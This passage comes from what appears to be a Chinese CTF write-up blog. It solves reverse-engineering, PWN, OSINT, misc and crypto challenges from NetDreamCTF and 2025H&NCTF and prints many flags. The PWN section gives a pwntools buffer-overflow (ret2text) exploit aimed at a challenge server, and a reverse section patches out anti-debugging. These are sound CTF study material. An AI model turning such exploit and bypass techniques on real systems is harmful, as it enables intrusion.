(v31 ^ ror(v30, <span class="number">3</span>i64)) - i % <span class="number">5</span>;</span><br><span class="line">    Str1[i] = v30;</span><br><span class="line">  &#125;</span><br><span class="line">  Str1[v32] = <span class="number">0</span>;</span><br><span class="line">  *Buffer = <span class="number">0</span>i64;</span><br><span class="line">  v7 = <span class="number">0</span>i64;</span><br><span class="line">  v8 = <span class="number">0</span>i64;</span><br><span class="line">  v9 = <span class="number">0</span>i64;</span><br><span class="line">  v10 = <span class="number">0</span>i64;</span><br><span class="line">  v11 = <span class="number">0</span>i64;</span><br><span class="line">  v12 = <span class="number">0</span>i64;</span><br><span class="line">  v13 = <span class="number">0</span>i64;</span><br><span class="line">  v14 = <span class="number">0</span>i64;</span><br><span class="line">  v15 = <span class="number">0</span>i64;</span><br><span class="line">  v16 = <span class="number">0</span>i64;</span><br><span class="line">  v17 = <span class="number">0</span>i64;</span><br><span class="line">  v18 = <span class="number">0</span>i64;</span><br><span class="line">  v19 = <span class="number">0</span>i64;</span><br><span class="line">  v20 = <span class="number">0</span>i64;</span><br><span class="line">  v21 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  v3 = __acrt_iob_func(<span class="number">1u</span>);</span><br><span class="line">  fflush(v3);</span><br><span class="line">  v4 = __acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(Buffer, <span class="number">128</span>, v4) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  Buffer[<span class="built_in">strcspn</span>(Buffer, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(Str1, Buffer) )</span><br><span class="line">    <span class="built_in">puts</span>(Str1);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先计算Str1，再输入字符串存入Buffer，需要两者相等。</p><p>将35行的anti_debug();反调试nop掉（call anti_debug），然后在Str1计算完成后的43行打断点，动调获取Str1结果即可。</p><p><img src="/2025/08/16/match-%E7%AC%AC%E4%B8%80%E5%B1%8ANetDreamCTF/image-20250816193133671.png" alt="image-20250816193133671"></p><p>flag：<code>flag&#123;Nu0_M1_Tu@n_Z1_1s_Th3_GO0d3st_CTF3r&#125;</code></p><p>​    </p><h3 id="ezre"><a href="#ezre" class="headerlink" title="ezre"></a>ezre</h3><p>先查壳，有upx壳，用XVolkolak脱壳，IDA打开，从字符串交叉引用找到主函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_401496</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">42</span>]; <span class="comment">// [esp+17h] [ebp-7Dh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">5</span>]; <span class="comment">// [esp+41h] [ebp-53h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">64</span>]; <span class="comment">// [esp+46h] [ebp-4Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+86h] [ebp-Eh]</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [esp+87h] [ebp-Dh]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+88h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+8Ch] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  sub_401C20();</span><br><span class="line">  j_printf(aInput);</span><br><span class="line">  <span class="keyword">if</span> ( !j_fgets(v3, <span class="number">64</span>, iob) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v3[j_strcspn(v3, asc_40506C)] = <span class="number">0</span>;</span><br><span class="line">  v2[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">  v2[<span class="number">1</span>] = <span class="number">2</span>;</span><br><span class="line">  v2[<span class="number">2</span>] = <span class="number">3</span>;</span><br><span class="line">  v2[<span class="number">3</span>] = <span class="number">4</span>;</span><br><span class="line">  v2[<span class="number">4</span>] = <span class="number">5</span>;</span><br><span class="line">  qmemcpy(v1, <span class="string">&quot;;s&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  v1[<span class="number">2</span>] = <span class="number">19</span>;</span><br><span class="line">  v1[<span class="number">3</span>] = <span class="number">27</span>;</span><br><span class="line">  v1[<span class="number">4</span>] = <span class="number">-13</span>;</span><br><span class="line">  v1[<span class="number">5</span>] = <span class="number">-127</span>;</span><br><span class="line">  v1[<span class="number">6</span>] = <span class="number">-127</span>;</span><br><span class="line">  v1[<span class="number">7</span>] = <span class="number">-127</span>;</span><br><span class="line">  v1[<span class="number">8</span>] = <span class="number">11</span>;</span><br><span class="line">  v1[<span class="number">9</span>] = <span class="number">-119</span>;</span><br><span class="line">  v1[<span class="number">10</span>] = <span class="number">-95</span>;</span><br><span class="line">  v1[<span class="number">11</span>] = <span class="number">-95</span>;</span><br><span class="line">  v1[<span class="number">12</span>] = <span class="number">-95</span>;</span><br><span class="line">  v1[<span class="number">13</span>] = <span class="number">73</span>;</span><br><span class="line">  v1[<span class="number">14</span>] = <span class="number">3</span>;</span><br><span class="line">  v1[<span class="number">15</span>] = <span class="number">-55</span>;</span><br><span class="line">  v1[<span class="number">16</span>] = <span class="number">-39</span>;</span><br><span class="line">  v1[<span class="number">17</span>] = <span class="number">11</span>;</span><br><span class="line">  v1[<span class="number">18</span>] = <span class="number">73</span>;</span><br><span class="line">  v1[<span class="number">19</span>] = <span class="number">-95</span>;</span><br><span class="line">  v1[<span class="number">20</span>] = <span class="number">-103</span>;</span><br><span class="line">  v1[<span class="number">21</span>] = <span class="number">51</span>;</span><br><span class="line">  v1[<span class="number">22</span>] = <span class="number">-127</span>;</span><br><span class="line">  v1[<span class="number">23</span>] = <span class="number">73</span>;</span><br><span class="line">  v1[<span class="number">24</span>] = <span class="number">35</span>;</span><br><span class="line">  v1[<span class="number">25</span>] = <span class="number">-87</span>;</span><br><span class="line">  v1[<span class="number">26</span>] = <span class="number">-71</span>;</span><br><span class="line">  v1[<span class="number">27</span>] = <span class="number">-87</span>;</span><br><span class="line">  v1[<span class="number">28</span>] = <span class="number">73</span>;</span><br><span class="line">  v1[<span class="number">29</span>] = <span class="number">-119</span>;</span><br><span class="line">  v1[<span class="number">30</span>] = <span class="number">-103</span>;</span><br><span class="line">  v1[<span class="number">31</span>] = <span class="number">-95</span>;</span><br><span class="line">  v1[<span class="number">32</span>] = <span class="number">-87</span>;</span><br><span class="line">  v1[<span class="number">33</span>] = <span class="number">-87</span>;</span><br><span class="line">  v1[<span class="number">34</span>] = <span class="number">-119</span>;</span><br><span class="line">  v1[<span class="number">35</span>] = <span class="number">-127</span>;</span><br><span class="line">  v1[<span class="number">36</span>] = <span class="number">-87</span>;</span><br><span class="line">  v1[<span class="number">37</span>] = <span class="number">-71</span>;</span><br><span class="line">  v1[<span class="number">38</span>] = <span class="number">-95</span>;</span><br><span class="line">  v1[<span class="number">39</span>] = <span class="number">-87</span>;</span><br><span class="line">  v1[<span class="number">40</span>] = <span class="number">-119</span>;</span><br><span class="line">  v1[<span class="number">41</span>] = <span class="number">-5</span>;</span><br><span class="line">  v6 = <span class="number">42</span>;</span><br><span class="line">  <span class="keyword">if</span> ( j_strlen(v3) == <span class="number">42</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v6; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = v3[i];</span><br><span class="line">      v4 = sub_401460(v1[i], <span class="number">3</span>) ^ v2[i % <span class="number">5</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v4 != v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        j_puts(aAccessDenied);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    j_puts(aAccessGranted);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    j_puts(aAccessDenied);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>v1中的值经sub_401460()的高低位交换操作后，与v2中的值异或，得到的值需与输入字符串相等。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v1 = [ <span class="number">0x3B</span>, <span class="number">0x73</span>, <span class="number">0x13</span>, <span class="number">0x1B</span>, <span class="number">0xF3</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0x81</span>, <span class="number">0x0B</span>, <span class="number">0x89</span>, </span><br><span class="line">  <span class="number">0xA1</span>, <span class="number">0xA1</span>, <span class="number">0xA1</span>, <span class="number">0x49</span>, <span class="number">0x03</span>, <span class="number">0xC9</span>, <span class="number">0xD9</span>, <span class="number">0x0B</span>, <span class="number">0x49</span>, <span class="number">0xA1</span>, </span><br><span class="line">  <span class="number">0x99</span>, <span class="number">0x33</span>, <span class="number">0x81</span>, <span class="number">0x49</span>, <span class="number">0x23</span>, <span class="number">0xA9</span>, <span class="number">0xB9</span>, <span class="number">0xA9</span>, <span class="number">0x49</span>, <span class="number">0x89</span>, </span><br><span class="line">  <span class="number">0x99</span>, <span class="number">0xA1</span>, <span class="number">0xA9</span>, <span class="number">0xA9</span>, <span class="number">0x89</span>, <span class="number">0x81</span>, <span class="number">0xA9</span>, <span class="number">0xB9</span>, <span class="number">0xA1</span>, <span class="number">0xA9</span>, </span><br><span class="line">  <span class="number">0x89</span>, <span class="number">0xFB</span>]</span><br><span class="line">v2 = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">42</span>):</span><br><span class="line">    m.append((((v1[i] &gt;&gt; <span class="number">3</span>) | (v1[i] &lt;&lt; <span class="number">5</span>)) ^ v2[i%<span class="number">5</span>]) &amp; <span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(m))</span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;flag&#123;123e4567-e89b-12d3-a456-426614174000&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="ezpwn"><a href="#ezpwn" class="headerlink" title="ezpwn"></a>ezpwn</h3><p>32位，IDA打开，vuln函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">68</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your payload: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x80</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read大小0x80&gt;0x48，存在栈溢出，且程序有现成shell函数，ret2text。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="string">&#x27;24592&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;payload: &#x27;</span>)</span><br><span class="line">shell = <span class="number">0x80491b6</span></span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x48</span>+<span class="number">4</span>) + p32(shell)</span><br><span class="line">r.send(pl)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>​    </p><h2 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h2><h3 id="Where-am-i"><a href="#Where-am-i" class="headerlink" title="Where_am_i"></a>Where_am_i</h3><blockquote><p>flag{建筑名}</p></blockquote><p>百度识图，搜索页：</p><p><a href="https://graph.baidu.com/s?card_key=&amp;entrance=GENERAL&amp;extUiData%5BisLogoShow%5D=1&amp;f=all&amp;isLogoShow=1&amp;session_id=6983026630174590425&amp;sign=126e3f68cddabb56bc7dd01755307670&amp;tpl_from=pc">https://graph.baidu.com/s?card_key=&amp;entrance=GENERAL&amp;extUiData%5BisLogoShow%5D=1&amp;f=all&amp;isLogoShow=1&amp;session_id=6983026630174590425&amp;sign=126e3f68cddabb56bc7dd01755307670&amp;tpl_from=pc</a></p><p><img src="/2025/08/16/match-%E7%AC%AC%E4%B8%80%E5%B1%8ANetDreamCTF/image-20250816191303010.png" alt="image-20250816191303010"></p><p>flag：<code>flag&#123;渥太华医院&#125;</code></p><p>​    </p><h3 id="Bridge"><a href="#Bridge" class="headerlink" title="Bridge"></a>Bridge</h3><blockquote><p>flag{桥名}</p></blockquote><p>百度识图，单独截图桥柱搜索，找到结果页跟进：</p><p><a href="https://mbd.baidu.com/newspage/data/dtlandingsuper?nid=dt_4627947414028434985&amp;sourceFrom=search_a">https://mbd.baidu.com/newspage/data/dtlandingsuper?nid=dt_4627947414028434985&amp;sourceFrom=search_a</a></p><p><img src="/2025/08/16/match-%E7%AC%AC%E4%B8%80%E5%B1%8ANetDreamCTF/image-20250816191151579.png" alt="image-20250816191151579"></p><p>​    flag：<code>flag&#123;牌楼长江大桥&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;本次NetDreamCTF由黄豆安全实验室主办，赛制为解题（Jeopardy），包括Misc、Crypto、Reverse、Web、PWN、OSINT六个方向的赛题，难度适中，适合大部分CTFer。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Rank: 3&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>2025H&amp;NCTF</title>
    <link href="https://lazzzaro.github.io/2025/06/08/match-2025H&amp;NCTF/"/>
    <id>https://lazzzaro.github.io/2025/06/08/match-2025H&amp;NCTF/</id>
    <published>2025-06-08T06:45:10.000Z</published>
    <updated>2025-06-08T08:18:10.311Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>竞赛时间：5月24日8:00—5月25日12:00（共28小时）</p><p>竞赛题型：涵盖 Web、Reverse、Pwn、Crypto、Misc 等主流赛题方向</p><p>奖项设置：前20名获奖，设一、二、三等奖及优胜奖，颁发荣誉证书及赞助奖品</p><p><strong>Rank: 10</strong></p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><blockquote><p>微信公众号搜索关注:”HuhstSec实验室”,发送: “H&amp;NCTF2025,Game start!!!” 获取flag</p></blockquote><p>发关键词。</p><p><code>H&amp;NCTF&#123;g4me_st4rtup_initialized_succ3$$&#125;</code></p><p>​    </p><h3 id="乱成一锅粥了"><a href="#乱成一锅粥了" class="headerlink" title="乱成一锅粥了"></a>乱成一锅粥了</h3><blockquote><p>小肖望着乱成一锅粥的电脑心如死灰，既然乱成一锅粥不妨低头将它喝下(flag为H&amp;NCTF{})</p></blockquote><p>从pcapng文件中提取出9个zip文件，解压成文件夹，查看里面txt文件名均为数字的md5值，按顺序提取txt内容连接，是png文件的base64。</p><p>分别输出9个png：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">folder = [<span class="string">&#x27;Up&#x27;</span>,<span class="string">&#x27;Down&#x27;</span>,<span class="string">&#x27;Left&#x27;</span>,<span class="string">&#x27;Right&#x27;</span>,<span class="string">&#x27;PGUP&#x27;</span>,<span class="string">&#x27;PGDN&#x27;</span>,<span class="string">&#x27;Home&#x27;</span>,<span class="string">&#x27;End&#x27;</span>,<span class="string">&#x27;NULL&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> folder:</span><br><span class="line">    g = <span class="built_in">open</span>(<span class="string">f&#x27;x/output/<span class="subst">&#123;f&#125;</span>.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    g_b = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        h1 = <span class="built_in">str</span>(i).zfill(<span class="number">2</span>).encode()</span><br><span class="line">        h2 = md5(h1).hexdigest()</span><br><span class="line">        g_b += <span class="built_in">open</span>(<span class="string">f&#x27;x/<span class="subst">&#123;f&#125;</span>/<span class="subst">&#123;h2&#125;</span>.txt&#x27;</span>).read()</span><br><span class="line">    g.write(b64decode(g_b))</span><br></pre></td></tr></table></figure><p>得到二维码的9个碎片，拼接，扫描：<br><code>H&amp;NCTF&#123;This_wont_be_difficult_for_you&#125;</code></p><p>​    </p><h3 id="芙宁娜的图片"><a href="#芙宁娜的图片" class="headerlink" title="芙宁娜的图片"></a>芙宁娜的图片</h3><blockquote><p>旅行者在追踪丘丘人的时候无意间找到了一张关于芙宁娜的老照片，派蒙拿起的时候感觉比普通的照片的重，发现后面有一行字，但你们都不会丘丘人语，推断这张图片这和丘丘人的下一步动作有关，你能帮旅行者破译出这个图片的信息吗？（flag为H&amp;NCTF{}）</p></blockquote><p>txt中，brainfuck得到 <code>O&amp;NPTF&#123;Y0u_yepognizeq_the_Couphu&#39;s_psog.&#125;</code>。</p><p>根据flag头，vigenere直接尝试出key=hanaaaa 时，flag为：</p><p><code>H&amp;NCTF&#123;Y0u_recognised_the_Chuchu&#39;s_plot.&#125;</code>。</p><p>png图没啥用。</p><p>​    </p><h3 id="谁动了黑线？"><a href="#谁动了黑线？" class="headerlink" title="谁动了黑线？"></a>谁动了黑线？</h3><blockquote><p>你接到一份神秘交易数据，隐藏着一条错综复杂的“黑线”，请破解其中隐藏的秘密 （最后的flag包上H&amp;NCTF{}提交）</p><p>hint1:尝试还原“真正”的交易链，关键在hash</p><p>hint2:flag内容为一段有意义的字符串</p></blockquote><p>观察txhash一列，base58解码后，是8位数字+8位字符串的形式，从中找出后8位字符串包含小写字母的项，按对应前8位数字大小顺序连接：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load the CSV</span></span><br><span class="line">df = pd.read_csv(<span class="string">&#x27;sheidongleheixian.csv&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Base58 decode implementation</span></span><br><span class="line">alphabet = <span class="string">&#x27;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b58decode</span>(<span class="params">s</span>):</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> s:</span><br><span class="line">        num = num * <span class="number">58</span> + alphabet.index(char)</span><br><span class="line">    byte_length = (num.bit_length() + <span class="number">7</span>) // <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> num.to_bytes(byte_length, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Decode tx_hash into ASCII strings and extract payload tails</span></span><br><span class="line">df[<span class="string">&#x27;decoded&#x27;</span>] = df[<span class="string">&#x27;tx_hash&#x27;</span>].apply(<span class="keyword">lambda</span> h: b58decode(h).decode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line">df[<span class="string">&#x27;idx&#x27;</span>] = df[<span class="string">&#x27;decoded&#x27;</span>].<span class="built_in">str</span>[<span class="number">2</span>:<span class="number">8</span>].astype(<span class="built_in">int</span>)</span><br><span class="line">df[<span class="string">&#x27;tail&#x27;</span>] = df[<span class="string">&#x27;decoded&#x27;</span>].<span class="built_in">str</span>[<span class="number">8</span>:]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Reconstruct the hidden message by ordering and concatenating tails</span></span><br><span class="line">x = df.sort_values(<span class="string">&#x27;idx&#x27;</span>)[<span class="string">&#x27;tail&#x27;</span>].tolist()</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> x:</span><br><span class="line">    <span class="keyword">if</span> k[<span class="number">0</span>].islower() <span class="keyword">or</span> k[<span class="number">1</span>].islower() <span class="keyword">or</span> k[<span class="number">2</span>].islower() <span class="keyword">or</span> k[<span class="number">3</span>].islower():</span><br><span class="line">        <span class="built_in">print</span>(k[:<span class="number">4</span>],end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># little_dog_is_Aomr!!</span></span><br></pre></td></tr></table></figure><p><code>H&amp;NCTF&#123;little_dog_is_Aomr!!&#125;</code></p><p>​    </p><h3 id="签退"><a href="#签退" class="headerlink" title="签退"></a>签退</h3><blockquote><p>微信公众号搜索关注:”林枫云”,发送”再见H&amp;NCTF2025,期待H&amp;NCTF2026”,获取flag</p></blockquote><p>发关键词。</p><p><code>H&amp;NCTF&#123;succ3ssfu1_134v3_ch3ck0u7_c0mp1373d&#125;</code></p><p>​    </p><h3 id="问卷"><a href="#问卷" class="headerlink" title="问卷"></a>问卷</h3><blockquote><p>为2025H&amp;NCTF留下最后的回响：<a href="https://wj.wenjuanjia.com/?questionId=czu4fckcGJDyHDJfT%2BNwDQ%3D%3D">https://wj.wenjuanjia.com/?questionId=czu4fckcGJDyHDJfT%2BNwDQ%3D%3D</a></p></blockquote><p>答问卷。</p><p><code>H&amp;NCTF&#123;Thank you for participating in 2025H&amp;NCTF!&#125;</code></p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="ez-factor"><a href="#ez-factor" class="headerlink" title="ez-factor"></a>ez-factor</h3><blockquote><p>哈基坤的签到题++</p></blockquote><p>ACD问题，参考 <a href="https://tangcuxiaojikuai.xyz/post/4a67318c.html#12">2024高校密码挑战赛 - 12</a>，构造格，能够规约出的小根上界约为243bit，本题 $r \in (2^{247},2^{248})$，爆破248-243=5位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="comment">################################################ gen data</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">N = <span class="number">155296910351777777627285876776027672037304214686081903889658107735147953235249881743173605221986234177656859035013052546413190754332500394269777193023877978003355429490308124928931570682439681040003000706677272854316717486111569389104048561440718904998206734429111757045421158512642953817797000794436498517023</span></span><br><span class="line">hint= <span class="number">128897771799394706729823046048701824275008016021807110909858536932196768365642942957519868584739269771824527061163774807292614556912712491005558619713483097387272219068456556103195796986984219731534200739471016634325466080225824620962675943991114643524066815621081841013085256358885072412548162291376467189508</span></span><br><span class="line">c = <span 